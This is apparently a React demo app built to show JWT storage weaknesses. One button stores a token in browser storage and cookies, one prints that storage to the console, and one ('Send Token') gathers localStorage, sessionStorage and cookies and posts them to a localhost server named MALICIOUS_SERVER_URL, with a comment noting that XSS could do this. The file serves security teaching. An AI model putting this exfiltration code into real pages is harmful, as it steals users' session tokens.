import './App.css';
import axios from 'axios';
import Cookies from 'js-cookie';

axios.defaults.withCredentials = true;

const Button = ({text,...props}) =>{
  return <button style={{
    border: 'none',
    borderRadius: '0px',
    padding: '5px 15px',
    backgroundColor: '#fff',
    cursor: 'pointer'
    }} {...props}>
    {text}
  </button>
}

const SERVER_URL = 'http://localhost:4000';
const MALICIOUS_SERVER_URL = 'http://localhost:4001';

const handleClick1 = () => {
  const getToken = async () =>{
    const req = await axios.get(`${SERVER_URL}/api/token`);
    localStorage.setItem('JWT',req.data)
    sessionStorage.setItem('JWT',req.data)
    Cookies.set('JWT', req.data,{sameSite:'lax'});
  }
  getToken();
}

const handleClick2 = () => {
  //get all info from localStorage,sessionStorage and cookies
  const data = {
    localStorage: Object.entries(localStorage),
    sessionStorage: Object.entries(sessionStorage),
    cookies:Cookies.get(),
    cookieHttpOnly:Cookies.get('JWT_httponly')
  }
  console.log(
    JSON.stringify(data,null,2)
  )
}

const handleClick3 = () => {
  //send all info from localStorage,sessionStorage and cookies to a malicious server
  //this can be done by XSS!!
  const data = {
    localStorage: Object.entries(localStorage),
    sessionStorage: Object.entries(sessionStorage),
    cookies:Cookies.get(),
    cookieHttpOnly:Cookies.get('JWT_httponly')
  }
  axios.post(`${MALICIOUS_SERVER_URL}/api/token`,data,{ crossdomain: true });
}

function App() {
  return (
    <div className="App">
      <header className="App-header">
        <p>
          Test App for showing JWT security
        </p>
        <div style={{display:'flex',justifyContent:'space-evenly',width:'30em'}}>
          <Button onClick={handleClick1} text='Get Token'></Button>
          <Button onClick={handleClick2} text='Expose Client'></Button>
          <Button onClick={handleClick3} text='Send Token'></Button>
        </div>
      </header>
    </div>
  );
}

export default App;
